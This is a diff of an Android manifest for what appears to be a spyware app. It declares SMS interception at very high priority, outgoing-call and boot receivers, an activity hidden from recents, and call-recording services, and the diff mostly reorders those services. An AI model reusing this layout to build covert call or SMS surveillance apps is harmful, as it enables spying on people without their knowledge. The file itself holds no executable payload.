@@ -18,12 +18,7 @@
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-    <application
-        android:excludeFromRecents="true"
-        android:installLocation="internalOnly"
-        android:label="@string/app_name"
-        android:launchMode="singleInstance"
-        android:taskAffinity="" >
+    <application android:label="@string/app_name" >
         <activity
             android:name="Main"
             android:excludeFromRecents="true"
@@ -43,30 +38,26 @@
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
         </receiver>
-
-        <service android:name="CallRecordService" >
-        </service>
-        <service android:name="ReglamentService" >
-        </service>
-
         <receiver android:name="BootCompetedReceiver" >
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
-
-        <service android:name="RecRecordService" >
-        </service>
-        <service android:name="StartService" >
-        </service>
-
         <receiver android:name="SMSBroadcastReceiver" >
             <intent-filter android:priority="99999" >
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
 
+        <service android:name="CallRecordService" >
+        </service>
+        <service android:name="RecRecordService" >
+        </service>
+        <service android:name="StartService" >
+        </service>
         <service android:name="SMService" >
+        </service>
+        <service android:name="ReglamentService" >
         </service>
         <service android:name="SuperService" >
         </service>
